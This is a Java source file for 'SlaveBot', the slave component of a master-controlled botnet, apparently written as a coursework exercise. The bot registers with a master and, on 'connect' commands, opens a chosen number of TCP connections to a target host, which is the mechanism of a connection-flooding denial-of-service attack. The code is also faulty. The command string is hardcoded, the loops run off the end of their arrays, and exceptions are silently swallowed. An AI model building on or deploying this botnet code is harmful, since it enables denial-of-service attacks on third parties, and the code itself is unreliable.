package bot;

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.Map.Entry;




public class SlaveBot implements Runnable {

	static ServerSocket slavePort;
	static Integer slaveListenPort;
	static Map<String, targetData> targetDataMap = new HashMap <String,targetData> ();
	static class targetData{  
		public String action;
		public String port;                                                                                                  
		public String targetHost; 
		public String numConnections;
		public Socket[] arrSoc;

		public targetData(String action, String targetHost, String port, String numConnections) {                                                                           
			this.port = port;                                                                                             
			this.targetHost = targetHost;   
			this.numConnections = numConnections;
			this.action = action;

		}                                                                                                                 
	}
	public void run() {
		try{
			while(true)
			{
				System.out.println("enter");
				String dataFromMaster = "connect 127.0.0.1 2000 5";
				extractTargetData(dataFromMaster);
				Socket listener = slavePort.accept();
				PrintWriter out = new PrintWriter(listener.getOutputStream(), true);
				BufferedReader in = new BufferedReader(new InputStreamReader(listener.getInputStream()));

				//To get the server's response, EchoClient reads from the BufferedReader object stdIn,
				BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));

			}        
		}
		catch (Exception e){
			System.out.println(e);
		}
	}

	public static void extractTargetData(String targetData){
		String delims = " ";
		StringTokenizer st = new StringTokenizer(targetData, delims);
		targetData targetObj = new targetData((String)st.nextElement(), ((String) st.nextElement()), ((String) st.nextElement()), (String) st.nextElement());
		storeTargetData(targetObj);
	}

	public static void storeTargetData(targetData targetObj){

		String uniqueKey = concatinatedData(targetObj.targetHost, targetObj.port);
		targetDataMap.put(uniqueKey, targetObj);
		Set<Entry<String, targetData>> set = targetDataMap.entrySet();
		Iterator<Entry<String, targetData>> iterator = set.iterator();		

		while(iterator.hasNext()) {
			Map.Entry slaveData = (Map.Entry)iterator.next();
		}

		if (targetObj.action.contentEquals("connect")){
			performConnect(targetObj.targetHost, targetObj.port, targetObj.numConnections, targetObj.arrSoc);
		}
		else if (targetObj.action.contentEquals("disconnect")){
			performDisconnect(targetObj.targetHost, targetObj.port, targetObj.arrSoc);
		}

	}

	public static String concatinatedData(String ip, String port){
		String concatinate = ip + port;
		return concatinate;
	}

	public static Integer registerSlave(String hostname, Integer masterport){
		Socket client_socket;
		try{
			client_socket = new Socket(hostname, masterport);
			PrintWriter out = new PrintWriter(client_socket.getOutputStream(), true);
			BufferedReader in = new BufferedReader(new InputStreamReader(client_socket.getInputStream()));

			String ip=(((InetSocketAddress) client_socket.getRemoteSocketAddress()).getAddress()).toString().replace("/","");
			Integer slavePort_int = (Integer) (client_socket.getLocalPort());
			String local_host = client_socket.getInetAddress().getHostAddress();

			System.out.println(ip + slavePort_int + local_host); //print here in slave just to confirm

			out.println(ip +","+ slavePort_int + "," + local_host);
			return slavePort_int;

		}
		catch (Exception e){
			System.out.println(e);
			return -1;
		}

	}

	public static void performConnect(String ip, String port, String numConnection, Socket[] arrSoc){
		String conKey = concatinatedData(ip, port);
		Integer numConnectionInt = Integer.parseInt(numConnection);
		Integer portInt = Integer.parseInt(port);
		arrSoc = new Socket[numConnectionInt];
		if (targetDataMap.containsKey(conKey)){
			try{
				for(int i = 0; i <= arrSoc.length; i++){
					arrSoc[i] = new Socket(ip, portInt);
					System.out.println(arrSoc[i]);
				}
				targetData obj = targetDataMap.get(conKey);
				obj.arrSoc = arrSoc;
			}
			catch(Exception e){
			}
		}
		else{
			System.out.println("Error Connecting to host");
		}

	}

	public static void performDisconnect(String ip, String port, Socket[] arrSoc) {
		String conKey = concatinatedData(ip, port);
		Integer portInt = Integer.parseInt(port);
		targetData obj = targetDataMap.get(conKey);

		if (targetDataMap.containsKey(conKey)){
			try{
				for(int i = 0; i<= obj.arrSoc.length; i++){
					Socket deleteSoc = obj.arrSoc[i];
					deleteSoc.close();				
				}
				targetDataMap.remove(conKey);
				
			}
			catch(Exception e){

			}
	
		}
		else {
			
		}
	}
	






	public static void main(String[] args) throws Exception {
		if(args.length != 4)
		{
			System.out.println("Usage: SlaveBot -h hostname -p portnumber of master");
			System.exit(0);
		}

		String hostname = args[1];
		Integer masterport = Integer.parseInt(args[3]);
		slaveListenPort = registerSlave(hostname, masterport);
		slavePort = new ServerSocket(slaveListenPort);
		new Thread(new SlaveBot()).start();

		for (Map.Entry<String, targetData> entry : targetDataMap.entrySet()) {
			System.out.println(entry.getKey() +" : " +entry.getValue().action + " : "+ entry.getValue().targetHost + " : " + entry.getValue().port + " : " + entry.getValue().numConnections);
			System.out.println("\nFor the key : " + entry.getKey() + "The array saved is" + entry.getValue().arrSoc);
		}


	}	

}
